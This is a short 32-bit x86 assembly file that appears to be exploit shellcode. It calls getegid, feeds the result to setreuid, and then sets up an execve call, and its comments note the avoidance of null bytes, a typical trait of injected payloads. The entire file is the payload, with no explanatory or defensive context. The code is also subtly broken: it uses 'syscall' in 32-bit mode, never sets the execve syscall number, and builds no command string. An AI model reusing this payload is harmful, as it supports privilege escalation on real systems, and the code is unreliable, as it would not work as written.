bits 32

global _start
section .text

_start:
    push 0x32
    pop eax         ; getegid, no null byte
    syscall

    mov ebx, eax    ; setreuid arg0
    mov ecx, eax    ; setreuid arg1
    push 0x46
    pop eax         ; setreuid, no null byte
    syscall
    
    lea ebx, [esp]  ; execve arg0 (pointer to argv[0])
    xor ecx, ecx    ; execve arg1
    xor edx, edx    ; execve arg2
    syscall
